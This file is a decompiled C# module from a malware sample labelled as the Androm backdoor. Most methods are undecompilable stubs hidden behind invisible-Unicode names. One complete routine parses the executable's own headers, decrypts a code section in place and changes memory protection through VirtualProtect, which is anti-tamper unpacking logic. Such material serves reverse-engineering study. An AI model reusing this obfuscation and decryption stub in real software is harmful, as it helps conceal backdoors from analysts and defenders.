// Decompiled with JetBrains decompiler
// Type: <Module>
// Assembly: kPrEErM, Version=9.8.7.1, Culture=neutral, PublicKeyToken=null
// MVID: 0D82AB67-E51A-41A4-A288-AD6EA4ED9B44
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Backdoor.MSIL.Androm.gen-1e36ddf6a89595dcc254a9688efec067f1292e962d3d62e3ab4b369ab8f9caa8.exe

using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;

internal class \u003CModule\u003E
{
  internal static byte[] \u200C⁭⁭⁯‬⁭⁫‎⁮⁭‪‌​⁮‫‭⁭⁯‫‪‎‍‬⁮‫⁭‫‫‎‌⁫‮⁬‪‫⁬‫‫‏‮;
  internal static \u003CModule\u003E.\u200F⁪‍⁯⁫‭‏‌‫⁭⁭⁮‬​⁫‍⁪‎‏⁫‎⁪‌‏‫‭‌⁫‪‌‌‪‫⁬​‬⁭‫⁫‮ \u202D⁮⁮⁭⁪⁫⁭⁭‍‌‍‍⁪​⁫‮​⁮‪‌‬‪‪‎‎⁪⁭⁭‎‫‪‍‎‬‮‮⁬‏⁮‎‮;
  internal static Assembly \u200F⁫‍‪‍‌‫‏​​‮⁫⁫⁪‮⁯‭‪⁪‬‏‮‫‫‬​⁪​⁮⁪‏⁮‬‮‭‪‏‪‍‌‮;
  internal static \u003CModule\u003E.\u206C⁫‎⁫‫⁫‮⁬⁪‪⁫‌‬‬​‪⁬⁭‍‍⁭‏⁮⁭‫‪‪‌‪⁪‬​‪‎‮⁭‮⁮‮‏‮ \u200D⁪‮‬‎⁮⁫⁭‎‌‌⁯⁪‎‭‌‌⁪​‫‭⁬⁬⁪‌‫⁭⁯‏‎⁫‮​​​‌⁫‫⁯‪‮;

  static \u003CModule\u003E()
  {
    \u003CModule\u003E.\u206D‍⁫‪‬‪‬⁮⁭‏⁯⁪⁮‎⁬⁯⁯‌‪⁫‌‮⁮⁬‭⁮⁫‬‫⁫‫‫⁬⁮⁭‌​‏‬⁭‮();
label_1:
    int num1 = 1959383725;
    while (true)
    {
      uint num2;
      switch ((num2 = (uint) (num1 ^ 1231614280)) % 5U)
      {
        case 0:
          \u003CModule\u003E.\u200F‭‫⁬‫‍‎‪‬‬⁯⁫‬⁬⁯⁬‮⁭‭‍‌⁭⁯‭‌‬⁯‬‌‏‬⁭⁯⁭⁫‬⁬⁯⁭‌‮();
          num1 = (int) num2 * -840959663 ^ 1650785519;
          continue;
        case 1:
          \u003CModule\u003E.\u200B⁭⁮​‬​‬‮‌‬⁭⁪⁪‭​⁯‮⁬‌‭‍‮⁬​‭‌‫‭‍⁮‪⁮‌⁫⁮⁬‭‍‫‭‮();
          \u003CModule\u003E.\u200D⁫‬‭⁬⁯⁬‎⁪‫⁯⁮⁭⁮‌​‫⁮‌⁫‌‬‬⁯‫‍​‬⁮‭‍⁪‫⁫​‬⁪⁭⁯‬‮();
          num1 = (int) num2 * 940324979 ^ -474125751;
          continue;
        case 2:
          goto label_1;
        case 3:
          goto label_3;
        case 4:
          \u003CModule\u003E.\u202C⁭​‪⁪‎⁪‪‏⁮⁫​⁮‏‏‍⁭​‬‮​‭​⁯⁬‬‭‌⁯‏‭⁪‌​⁮‫​‬‭‮‮();
          num1 = (int) num2 * -1001011405 ^ 524840807;
          continue;
        default:
          goto label_7;
      }
    }
label_3:
    return;
label_7:;
  }

  private static void \u200F‭‫⁬‫‍‎‪‬‬⁯⁫‬⁬⁯⁬‮⁭‭‍‌⁭⁯‭‌‬⁯‬‌‏‬⁭⁯⁭⁫‬⁬⁯⁭‌‮()
  {
    // ISSUE: unable to decompile the method.
  }

  private static void \u200B‎⁫⁫‫‮​‍‮⁯⁬⁭‎⁮‌⁪⁪‮‍‬⁫‪⁬‫⁪‪‪⁬⁮‬‭‍‪⁬‌⁪⁬⁯‍‍‮([In] object obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  [DllImport("kernel32.dll", EntryPoint = "VirtualProtect")]
  internal static extern unsafe bool \u202C‮‬⁫⁪⁬⁯‫⁬​⁪⁭‭⁫⁪‬‎‮‬⁮‎‎‍‏‍‭⁬‍⁬‮⁯‍⁭‫‍‌‍‌⁮⁯‮(
    [In] byte* obj0,
    [In] int obj1,
    [In] uint obj2,
    [In] ref uint obj3);

  internal static void \u202C⁭​‪⁪‎⁪‪‏⁮⁫​⁮‏‏‍⁭​‬‮​‭​⁯⁬‬‭‌⁯‏‭⁪‌​⁮‫​‬‭‮‮()
  {
    // ISSUE: unable to decompile the method.
  }

  static Type \u200F‌⁬​‍⁬‫‏‬⁪⁫⁬‪​‬‮‬​​⁯‪‫‏⁫‫‪‏‬​‌‍‫‍‪⁮⁮‭‫‍⁮‮([In] RuntimeTypeHandle obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  static Type \u200B‭‫⁭‏⁫‍⁫⁬‏⁫​⁯⁪⁮⁯⁯⁬⁮⁮‏⁯⁭‮​‮⁬‌⁯‮‎‫‍‌‮‭⁪‎⁮‮([In] RuntimeTypeHandle obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  static MethodInfo \u202D‏⁯⁭‎‫⁫⁭‌⁪⁫‭⁭‎‮‌‍‌⁫⁯‬⁬​⁫⁫‌‎‮‮⁪‎⁯‫⁯‫⁮⁮⁫‭‬‮(
    [In] Type obj0,
    [In] string obj1,
    [In] Type[] obj2)
  {
    // ISSUE: unable to decompile the method.
  }

  static string \u206F⁪‌​‫‮⁪​‌⁭‫‌‍‌‮‮⁬‏⁬‌‫⁯‎⁪‪‬​‪​⁬‏⁯‫​‏‫⁫⁫‭‫‮([In] string obj0, [In] string obj1)
  {
    // ISSUE: unable to decompile the method.
  }

  static object \u206D‌⁯⁯⁫‌‪‮⁭‎⁬‎‎⁭⁫‎​‬⁫‏‏‌‬‬⁯‎⁫‍‬⁭‫‎⁫‬​‍⁯⁮⁯‪‮(
    [In] MethodBase obj0,
    [In] object obj1,
    [In] object[] obj2)
  {
    // ISSUE: unable to decompile the method.
  }

  static bool \u206A⁮‪‭⁬⁬⁬⁯‌‌⁪‮‫‍‫⁯‍‪​‏‎‮‌​‬‎⁪‪‍⁬‍‪⁯‎‌‍‎‮‫⁯‮([In] object obj0, [In] object obj1)
  {
    // ISSUE: unable to decompile the method.
  }

  static void \u200C⁭‏‌⁯⁪⁭⁭⁬‌⁭⁭⁬‬‌‪⁬⁭‏‍‭‫​‭⁯‌⁭‎​‍‏‌‬⁮‬‭‫‫⁯‮‮([In] string obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  static Thread \u200D⁫⁮‏‬⁪‬⁪‪‬‮⁫‮⁪⁭‏‮‮​⁭⁪‏​‌⁮‮⁮‌‌⁯​‮⁮⁪‮​‏⁫⁯‪‮([In] ParameterizedThreadStart obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  static void \u202D⁪‭⁫⁪‍‫‪‪‬‌⁪‎‫​‌‌⁫⁫⁯‭⁭‏‬‮‌‏‌‏‍‮⁮‮⁪‫⁯‫‫‫‮([In] Thread obj0, [In] bool obj1)
  {
    // ISSUE: unable to decompile the method.
  }

  static void \u200E‌‭⁫⁭‍⁭⁮⁭‭‎⁭‍‍‍‌‍‌‭‮‬‮‫‪‭‍‬‪‬⁪⁬⁬⁯⁭‬‎‎‫⁫‮([In] Thread obj0, [In] object obj1)
  {
    // ISSUE: unable to decompile the method.
  }

  static Thread \u200E⁯⁪⁬⁭‍⁮‪‪⁪⁮⁫​‮​‮⁬⁭‫‪‭⁫‫⁬‫‌‭‬⁯⁫‌‫‎‎‌⁪‏‏⁬‬‮([In] ParameterizedThreadStart obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  static void \u200E⁫⁪‎⁫⁭‮‏‪‫‬​⁪‭‫‍‍⁫⁭⁯‪⁯‌⁬⁪‮⁪‬‌⁫‎‫‫‫‏⁫‎⁫‎‌‮([In] Thread obj0, [In] bool obj1)
  {
    // ISSUE: unable to decompile the method.
  }

  static Thread \u202D‌‬⁮⁮‫⁮‎⁬‌‌⁬⁬⁬‌‪‍⁬⁮⁮⁫⁫‍⁫‍‮‎‫‮​​‌⁪⁮⁪‫⁪‎‮‮()
  {
    // ISSUE: unable to decompile the method.
  }

  static void \u200F‌‫‌‎‏‫⁮‍⁬‪‍⁬‭‮⁯‌‪⁪‪‬⁪‍‎‫⁬‏⁬⁭⁬‍⁭⁭‮‍⁯⁫‎⁭‮‮([In] Thread obj0, [In] object obj1)
  {
    // ISSUE: unable to decompile the method.
  }

  static void \u200E‎​⁭⁭‮⁭​‫⁬⁪⁫‮‫⁯‎​‪‬⁪‎⁯​‌⁮⁭⁭‬‪⁫⁭⁭​⁯‏‎‫‌⁭‭‮([In] int obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  static bool \u200C⁭‍⁪‏⁮‌‎‏‎⁪⁫‎⁭⁭⁬‮‌⁮‌‏‌‫⁫‌​‪‌‎⁬‍⁭⁭‎‮​⁯‭‍‫‮()
  {
    // ISSUE: unable to decompile the method.
  }

  static bool \u202E‬⁮‬⁪‮⁫‎⁬⁮‍⁬‌‏‏‬‮​‮‏⁫‌⁭⁯‏⁮⁪‮⁬‌‬⁫‭⁮‫⁯⁮‫⁫‭‮()
  {
    // ISSUE: unable to decompile the method.
  }

  static void \u202E‎‫‏‭‮‭‮‎​⁬‏‮‏‪⁫‍‍⁬‭‍‍​⁭‬‌‍⁮​⁪⁯‎⁯‬‭⁬‪‫⁮‫‮([In] string obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  static bool \u200F⁫‎​‬⁯⁮‍⁮‌‭‏⁫‮‫‬‪⁭⁫‎⁬‮⁫⁮⁮‭‏‏⁮‫‎⁫⁭‌‎⁮‪​‍‭‮([In] Thread obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  static void \u206D⁮‪‏⁭​⁬⁮‪⁪⁬⁬‍⁫⁭​⁬‏⁪​⁫⁭⁭‍‏⁫⁪‭‏‫‫‬⁫⁫‫⁫‫‍‌‌‮([In] string obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  static void \u206A⁪‌‏‬‬‌‌⁪⁭‭‬⁭‫‍‏‬⁮⁭⁮‭‪⁭‎‌‍⁭‪⁯⁭⁫​​⁮⁪⁯‪‪‏⁮‮([In] int obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  static Type \u202A‭‬⁬‬‎⁮‎‌‍‎‭‎⁫⁮⁬‪‌⁬⁬‪‎​​⁬​⁮‍⁯⁬‬​‪‪‏‬‍‌⁪⁮‮([In] RuntimeTypeHandle obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  static Module \u200C​‭‭⁭‍‪‬⁬‎⁫⁪⁯⁪‌‫​‎‭⁬⁮‮⁯⁯‮‭‬‪⁭‫‮‌⁪‏‭‫‎‬⁮‌‮([In] Type obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  static IntPtr \u202D‫⁮​‍‪‬‭⁪⁪⁯‬‪⁯⁬​⁪‎‎⁪‌‫‬⁪‪⁯⁪‍‭‬‬‍⁫⁭‬⁬⁪‮‌‫‮([In] Module obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  static string \u202D‍‏⁭⁪⁬⁯⁮⁮⁮⁪⁫‪⁭‮‎⁭‮‫⁯‫⁮​⁭‌‮⁬⁯⁮⁮‎‏⁪‏‬‌​⁮‌‌‮([In] Module obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  static char \u200B‌‌⁪⁯​​‮‮⁪‍‍‮‌‍⁫‏​⁪⁯‏⁮‎‏‌‏​‭‍‌‍‪‮‎​‪‮‮⁭⁭‮([In] string obj0, [In] int obj1)
  {
    // ISSUE: unable to decompile the method.
  }

  static void \u202B‍‎‫⁮​⁮‮‭‪‮‍‮⁫‬‎‮⁬⁮⁯‌‌⁫⁭‏⁭‪⁮⁪⁪⁫⁪​⁯‍‫‍‏⁭‌‮(
    [In] byte[] obj0,
    [In] int obj1,
    [In] IntPtr obj2,
    [In] int obj3)
  {
    // ISSUE: unable to decompile the method.
  }

  static void \u206D⁭⁭‫‬⁫‪⁯⁬‮⁪‏⁪⁯⁮‮‪‭‬‫‪‍‭⁮‌‪⁮⁫‎‮‫⁯‍‏‎‬‮⁬⁯‪‮(
    [In] byte[] obj0,
    [In] int obj1,
    [In] IntPtr obj2,
    [In] int obj3)
  {
    // ISSUE: unable to decompile the method.
  }

  internal static byte[] \u200E‍⁮⁭⁪⁮‏‬⁪‮⁭⁬‬⁬‮‭‮‌⁯‫‫⁪⁭‎​⁮‬‏‫​⁫⁭‪⁪‮‌‎‏‎⁫‮([In] byte[] obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  internal static void \u200D⁫‬‭⁬⁯⁬‎⁪‫⁯⁮⁭⁮‌​‫⁮‌⁫‌‬‬⁯‫‍​‬⁮‭‍⁪‫⁫​‬⁪⁭⁯‬‮()
  {
    // ISSUE: unable to decompile the method.
  }

  internal static \u002D \u206E‬‎‫‬‪⁮‎⁯‌⁪⁫⁯⁪‬​‏⁫⁬‎‬‎⁯‭‌‍⁮⁪⁫⁪‏⁯‪‍⁯‎‫‪⁭‫‮<\u002D>([In] uint obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  internal static \u002D \u206B‮‎⁫‮​​‌‏‫‭‏⁬⁪‭‬⁫​‬‏⁬‍‫‌​⁪‪‎‏⁬⁬‫⁯⁮‬‌⁬‪⁬‮‮<\u002D>([In] uint obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  internal static \u002D \u202A⁯​‮‮​‮⁫⁪⁮​‬⁫⁯⁯⁮⁯‮⁫‫⁪⁮​⁪⁪‏‎‮⁮‭‬‮⁬‍⁪‏⁮⁭‬⁪‮<\u002D>([In] uint obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  internal static \u002D \u202B​​‌‮​⁫⁫‫‎⁬​⁮‪⁭‪‪‪‮‍‎‪‫‮‭⁮⁯‮‪⁮⁬‫‮‬‎‎‪‮⁯⁯‮<\u002D>([In] uint obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  internal static \u002D \u202D⁪‭‭‭‫‍⁮‌⁬⁭⁭‫‎⁬‏‮​​⁯‫⁬⁮‎‍‎‏​‏‍⁯‮​‪‭⁬‏​​‬‮<\u002D>([In] uint obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  internal static void \u200B⁭⁮​‬​‬‮‌‬⁭⁪⁪‭​⁯‮⁬‌‭‍‮⁬​‭‌‫‭‍⁮‪⁮‌⁫⁮⁬‭‍‫‭‮()
  {
    // ISSUE: unable to decompile the method.
  }

  internal static Assembly \u200E⁮‫⁮⁮⁭⁮‭‎⁬‫⁯⁫‎⁮‮‫‎⁪⁭⁭⁬​‎‏‭⁯⁬⁯‍‫‫⁬‌⁯⁯‍‬‍‪‮(
    [In] object obj0,
    [In] ResolveEventArgs obj1)
  {
    // ISSUE: unable to decompile the method.
  }

  [DllImport("kernel32.dll", EntryPoint = "VirtualProtect")]
  internal static extern bool \u206C⁬‏⁫‍⁭‬‮‏⁪​⁪‪‏‌‭⁫‬‬‎‌‍‭‍⁬‭‭‍‬‏‍⁭⁬⁭⁯‪⁯‬‪‫‮(
    [In] IntPtr obj0,
    [In] uint obj1,
    [In] uint obj2,
    [In] ref uint obj3);

  internal static unsafe void \u206D‍⁫‪‬‪‬⁮⁭‏⁯⁪⁮‎⁬⁯⁯‌‪⁫‌‮⁮⁬‭⁮⁫‬‫⁫‫‫⁬⁮⁭‌​‏‬⁭‮()
  {
    Module module = typeof (\u003CModule\u003E).Module;
    string fullyQualifiedName = module.FullyQualifiedName;
label_1:
    int num1 = 109943899;
    while (true)
    {
      uint num2;
      int num3;
      uint num4;
      uint num5;
      uint num6;
      uint num7;
      uint* numPtr1;
      uint num8;
      uint[] numArray1;
      uint[] numArray2;
      int index;
      uint num9;
      uint num10;
      byte* hinstance;
      bool flag;
      uint* numPtr2;
      uint num11;
      uint num12;
      ushort num13;
      uint num14;
      uint num15;
      uint* numPtr3;
      byte* numPtr4;
      ushort num16;
      uint num17;
      int num18;
      int num19;
      switch ((num2 = (uint) (num1 ^ 1280752746)) % 53U)
      {
        case 0:
          num18 = (int) *numPtr1;
          break;
        case 1:
          int num20;
          num1 = num20 = num4 != 0U ? 1002044229 : (num20 = 206782149);
          continue;
        case 2:
          numArray2 = new uint[16];
          num1 = (int) num2 * -1456843165 ^ -599795164;
          continue;
        case 3:
          ++num7;
          num1 = (int) num2 * -1742394869 ^ -1147699468;
          continue;
        case 4:
          int num21;
          num1 = num21 = index >= 16 ? 1460055720 : (num21 = 1668433210);
          continue;
        case 5:
          num1 = (int) num2 * -1498341604 ^ 1446576329;
          continue;
        case 6:
          numArray1[11] = numArray1[11] + numArray2[11];
          num1 = (int) num2 * -659901407 ^ -1983828376;
          continue;
        case 7:
          numArray1[5] = numArray1[5] + numArray2[5];
          num1 = (int) num2 * 1444338463 ^ -351280947;
          continue;
        case 8:
          int num22 = num12 != 64U ? -1597533084 : (num22 = -1405835942);
          num1 = num22 ^ (int) num2 * 1446411276;
          continue;
        case 9:
          goto label_3;
        case 10:
          numArray1[12] = numArray1[12] ^ numArray2[12];
          num1 = (int) num2 * -1611786271 ^ 497887123;
          continue;
        case 11:
          index = 0;
          num1 = (int) num2 * 1928160512 ^ 1684868159;
          continue;
        case 12:
          ++num3;
          num1 = (int) num2 * 1392086207 ^ 1680249121;
          continue;
        case 13:
          num10 = num15;
          ++num14;
          num1 = (int) num2 * 2080521310 ^ -955183246;
          continue;
        case 14:
          num7 = 0U;
          num1 = (int) num2 * 736409396 ^ 1881374526;
          continue;
        case 15:
          numPtr2 = (uint*) (hinstance + (flag ? (int) numPtr1[3] : (int) numPtr1[1]));
          num11 = numPtr1[2] >> 2;
          num1 = 173789755;
          continue;
        case 16:
          ++num17;
          num1 = (int) num2 * -723904789 ^ -869226650;
          continue;
        case 17:
          num1 = (int) num2 * 175411733 ^ -1263453270;
          continue;
        case 18:
          if (fullyQualifiedName.Length > 0)
          {
            num1 = (int) num2 * 1831990130 ^ 1613063651;
            continue;
          }
          num19 = 0;
          goto label_48;
        case 19:
          int num23;
          num1 = num23 = num7 >= num8 ? 143871403 : (num23 = 2069121511);
          continue;
        case 20:
          numArray1[13] = numArray1[13] * numArray2[13];
          numArray1[14] = numArray1[14] + numArray2[14];
          numArray1[15] = numArray1[15] ^ numArray2[15];
          num12 = 64U;
          num1 = (int) num2 * 865346334 ^ -2107115945;
          continue;
        case 21:
          int num24 = num4 == 1851748922U ? -1005218453 : (num24 = -118563332);
          num1 = num24 ^ (int) num2 * 2102482785;
          continue;
        case 22:
          numPtr3 = (uint*) null;
          num8 = 0U;
          numPtr1 = (uint*) (numPtr4 + 24 + (int) num16);
          num1 = (int) num2 * -91775044 ^ 1108177688;
          continue;
        case 23:
          num6 = num5;
          num1 = (int) num2 * 1226307982 ^ -696204032;
          continue;
        case 24:
          num1 = (int) num2 * -388280892 ^ -568032582;
          continue;
        case 25:
          goto label_13;
        case 26:
          numArray1[0] = numArray1[0] ^ numArray2[0];
          numArray1[1] = numArray1[1] * numArray2[1];
          numArray1[2] = numArray1[2] + numArray2[2];
          num1 = (int) num2 * 1412055862 ^ 1217795588;
          continue;
        case 27:
          numArray1[4] = numArray1[4] * numArray2[4];
          num1 = (int) num2 * 181890710 ^ 32221530;
          continue;
        case 28:
          num19 = fullyQualifiedName[0] == '<' ? 1 : 0;
          goto label_48;
        case 29:
          goto label_1;
        case 30:
          numPtr1 += 8;
          num1 = 2048472559;
          continue;
        case 31:
          int num25;
          num1 = num25 = num14 < num11 ? 1159851148 : (num25 = 206782149);
          continue;
        case 32:
          uint* numPtr5 = numPtr3;
          int num26 = (int) *numPtr5 ^ (int) numArray1[(IntPtr) (num17 & 15U)];
          *numPtr5 = (uint) num26;
          numArray1[(IntPtr) (num17 & 15U)] = (uint) (((int) numArray1[(IntPtr) (num17 & 15U)] ^ (int) *numPtr3++) + 1035675673);
          num1 = 741564664;
          continue;
        case 33:
          numArray1[8] = numArray1[8] + numArray2[8];
          num1 = (int) num2 * -1845229786 ^ -1617740354;
          continue;
        case 34:
          numArray1[3] = numArray1[3] ^ numArray2[3];
          num1 = (int) num2 * -1124617258 ^ 1382127177;
          continue;
        case 35:
          numArray2[index] = num5;
          num6 = num5 >> 5 | num5 << 27;
          num5 = num9 >> 3 | num9 << 29;
          num9 = num10 >> 7 | num10 << 25;
          num10 = num6 >> 11 | num6 << 21;
          ++index;
          num1 = (int) num2 * -232372158 ^ -1976234687;
          continue;
        case 36:
          num9 = 1785494169U;
          num1 = (int) num2 * 419854350 ^ 1933697453;
          continue;
        case 37:
          num6 = 1334289260U;
          num1 = (int) num2 * -1963878252 ^ 1513102905;
          continue;
        case 38:
          int num27;
          num1 = num27 = num3 < (int) num13 ? 488339788 : (num27 = 299272682);
          continue;
        case 39:
          \u003CModule\u003E.\u206C⁬‏⁫‍⁭‬‮‏⁪​⁪‪‏‌‭⁫‬‬‎‌‍‭‍⁬‭‭‍‬‏‍⁭⁬⁭⁯‪⁯‬‪‫‮((IntPtr) (void*) numPtr3, num8 << 2, num12, ref num12);
          num1 = (int) num2 * -44661491 ^ 1714275385;
          continue;
        case 40:
          numPtr3 = (uint*) (hinstance + (flag ? (int) numPtr1[3] : (int) numPtr1[1]));
          if (flag)
          {
            num18 = (int) numPtr1[2];
            break;
          }
          num1 = 617996745;
          continue;
        case 41:
          numArray1[index] = num10;
          num1 = 446143925;
          continue;
        case 42:
          num17 = 0U;
          num1 = 1672426633;
          continue;
        case 43:
          uint* numPtr6 = numPtr1;
          uint* numPtr7 = (uint*) ((IntPtr) numPtr6 + new IntPtr(4));
          int num28 = (int) *numPtr6;
          uint* numPtr8 = numPtr7;
          numPtr1 = (uint*) ((IntPtr) numPtr8 + new IntPtr(4));
          int num29 = (int) *numPtr8;
          num4 = (uint) (num28 * num29);
          num1 = 313794364;
          continue;
        case 44:
          num15 = (uint) (((int) num6 ^ (int) *numPtr2++) + (int) num5 + (int) num9 * (int) num10);
          num1 = 728645387;
          continue;
        case 45:
          numArray1 = new uint[16];
          num1 = (int) num2 * 1824421670 ^ 567055622;
          continue;
        case 46:
          numArray1[9] = numArray1[9] ^ numArray2[9];
          numArray1[10] = numArray1[10] * numArray2[10];
          num1 = (int) num2 * -1389517635 ^ -699302072;
          continue;
        case 47:
          num14 = 0U;
          num1 = (int) num2 * 991560848 ^ 244479998;
          continue;
        case 48:
          num5 = 338683415U;
          num1 = (int) num2 * 864938352 ^ -582558372;
          continue;
        case 49:
          numArray1[6] = numArray1[6] ^ numArray2[6];
          numArray1[7] = numArray1[7] * numArray2[7];
          num1 = (int) num2 * 1630942943 ^ -636817285;
          continue;
        case 50:
          num5 = num10;
          num1 = (int) num2 * -1272997017 ^ 1504107128;
          continue;
        case 51:
          num10 = 2216230296U;
          num3 = 0;
          num1 = (int) num2 * 593203510 ^ 1010575128;
          continue;
        case 52:
          num5 = num9;
          num1 = (int) num2 * -808841779 ^ -1247837826;
          continue;
        default:
          goto label_61;
      }
      num8 = (uint) num18 >> 2;
      num1 = 761359887;
      continue;
label_48:
      flag = num19 != 0;
      hinstance = (byte*) (void*) Marshal.GetHINSTANCE(module);
      numPtr4 = hinstance + (int) *(uint*) (hinstance + 60);
      num13 = *(ushort*) (numPtr4 + 6);
      num16 = *(ushort*) (numPtr4 + 20);
      num1 = 1312751394;
    }
label_3:
    return;
label_13:
    return;
label_61:;
  }

  internal struct \u206E‏‪‬‏‌‍​⁪⁮⁪⁭⁫⁪‌⁮⁪‬‍‬‌⁪‮‮⁫‌‮‪‍‏⁭‮‪‍‬‭⁭⁭​‪‮
  {
    internal uint \u206C‎⁭‏‮⁭‪‏‎⁪‬⁯⁯‍⁭⁮⁯⁫‬‍⁯‍⁫‌‏‫⁮​‪⁬‌‮‫⁭‫‮‬‌‌‭‮;

    internal void \u202D‌⁮‭‪⁭⁯‪‬‮⁪‎​⁬‫⁫‮‌‬‌​‫⁮​‪⁬⁯‌‪‍⁮‬‎‪‪⁬⁮​‫‫‮()
    {
      // ISSUE: unable to decompile the method.
    }

    internal uint \u200B‭​‏‎⁪‪‍‮‏‮‬‫​‌⁪‫‍⁪‮⁪‬‫‮‎‪‏⁯​⁪⁮⁮⁪‫‍⁮⁬‌⁭‮(
      [In] \u003CModule\u003E.\u202C‍⁫‭⁭‎‬‭‍‌‫‍‎‎⁬‍‍⁮‍‍‮‎‭‏⁬‏‬‎⁬⁮⁬⁭‏‏⁭‌⁪‬⁯‎‮ obj0)
    {
      // ISSUE: unable to decompile the method.
    }
  }

  internal struct \u206E⁪⁮⁪‌‎⁪‪‫⁭‪⁭‮‮⁮⁮⁪⁬‪⁯‎⁪⁮‍⁮⁮‮‮‏‫‫‏⁫⁭‌​‍⁮‍⁪‮
  {
    internal readonly \u003CModule\u003E.\u206E‏‪‬‏‌‍​⁪⁮⁪⁭⁫⁪‌⁮⁪‬‍‬‌⁪‮‮⁫‌‮‪‍‏⁭‮‪‍‬‭⁭⁭​‪‮[] \u200F⁪‎‭‌⁪⁭‍‍‌‮⁬​⁬‪‪‎⁬‪‌⁮‮⁭‪‭‫‎⁭‭⁭‫‭‏‎​‏⁭​‭‌‮;
    internal readonly int \u206D⁮‏‫⁪‭‮⁮‫‎​⁯‮‏⁬⁪‬⁯⁫‬‍⁬‬‌⁮‌‫‮⁫⁪‍​⁬⁪‪⁪⁯⁬⁯‏‮;

    internal \u206E⁪⁮⁪‌‎⁪‪‫⁭‪⁭‮‮⁮⁮⁪⁬‪⁯‎⁪⁮‍⁮⁮‮‮‏‫‫‏⁫⁭‌​‍⁮‍⁪‮([In] int obj0)
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u200D⁬‎⁭​‬‬‌⁭‏⁫‬⁭‏‎⁭‪⁭⁫‎⁭‍⁬⁭⁬‬‌​‌‌‪⁮‍‎⁪‌‪‬‬‮‮()
    {
      // ISSUE: unable to decompile the method.
    }

    internal uint \u206F‪‪⁯⁪⁫‏‬‮‭⁭⁬‪‌⁯‏⁪‫⁪‏⁬⁮⁯‮⁯​‬⁪‬‫‬⁯‪‌⁮⁯‍‏⁮⁮‮(
      [In] \u003CModule\u003E.\u202C‍⁫‭⁭‎‬‭‍‌‫‍‎‎⁬‍‍⁮‍‍‮‎‭‏⁬‏‬‎⁬⁮⁬⁭‏‏⁭‌⁪‬⁯‎‮ obj0)
    {
      // ISSUE: unable to decompile the method.
    }

    internal uint \u200C‍‫‫‍​‭⁬​⁫‭⁪​​⁯⁬⁪‫‪⁮‍‏⁯⁮‮​‮⁮‍‌⁫‪‍​‭‭⁭⁪⁯‭‮(
      [In] \u003CModule\u003E.\u202C‍⁫‭⁭‎‬‭‍‌‫‍‎‎⁬‍‍⁮‍‍‮‎‭‏⁬‏‬‎⁬⁮⁬⁭‏‏⁭‌⁪‬⁯‎‮ obj0)
    {
      // ISSUE: unable to decompile the method.
    }

    internal static uint \u206F⁮‫‏‎‪‎‬‬‎​‏⁯‏⁭‭⁯‍⁪‎​⁭‮⁭‍⁭⁫‬⁮⁮⁯‫‮⁪‭⁭‪‭‏‍‮(
      [In] \u003CModule\u003E.\u206E‏‪‬‏‌‍​⁪⁮⁪⁭⁫⁪‌⁮⁪‬‍‬‌⁪‮‮⁫‌‮‪‍‏⁭‮‪‍‬‭⁭⁭​‪‮[] obj0,
      [In] uint obj1,
      [In] \u003CModule\u003E.\u202C‍⁫‭⁭‎‬‭‍‌‫‍‎‎⁬‍‍⁮‍‍‮‎‭‏⁬‏‬‎⁬⁮⁬⁭‏‏⁭‌⁪‬⁯‎‮ obj2,
      [In] int obj3)
    {
      // ISSUE: unable to decompile the method.
    }
  }

  internal class \u202C‍⁫‭⁭‎‬‭‍‌‫‍‎‎⁬‍‍⁮‍‍‮‎‭‏⁬‏‬‎⁬⁮⁬⁭‏‏⁭‌⁪‬⁯‎‮
  {
    internal uint \u206E‎⁭‫​‮‫‍‫⁮‫⁬⁫‫‮‭⁫‭‮⁬⁯‍⁬⁬‍‪‏‎⁭‪⁯⁬‪‫‌‭‍⁯‌‮‮;
    internal uint \u200F‫‮‬‎‮‏‬‏‪‭‌‏​⁮⁫⁮⁪‍⁪⁪‬‌⁪‎⁫‫⁬⁮‫‫⁬⁫⁫‬⁭⁫‫​⁪‮;
    internal Stream \u206F‪⁮⁫⁬⁮‎‎⁯‎‪​‮‍⁯‌‪⁭‭⁪⁮​‍​‍⁭⁬‍‬‭‭‮‫⁬‏⁯‭‎‫‮;

    internal void \u200C‫‍‌⁪⁯⁬⁫⁮‮‌⁮⁭‫‪​‏⁭‮​⁫‪⁭⁭‬⁫‭​‫‌⁯⁮‭⁭‍‪‮⁯‏⁫‮([In] Stream obj0)
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u202C‫⁭‍‫​‌‫⁪‫‬‭‭⁮‬⁮⁭‍‮‍‏⁮‍⁭‪‭‏‎‎⁭⁬⁫⁫⁯‬‮‪‪⁫⁯‮()
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u202E⁫‌‌⁪​‬‌‬⁫‏‭⁭⁫‌‌⁯⁮‮⁬‪‬⁮‍‫‏‫⁫⁬⁯⁬⁪‭‍‏⁭‏‭‭‏‮()
    {
      // ISSUE: unable to decompile the method.
    }

    internal uint \u202C‪‎​‬‬‮‎‭‏⁬‎‎‍‏‎⁮⁪‏‌​⁬‭‬⁬⁪‏‫⁮‭⁬‬‏‍‫‫‍‪‍⁬‮([In] int obj0)
    {
      // ISSUE: unable to decompile the method.
    }

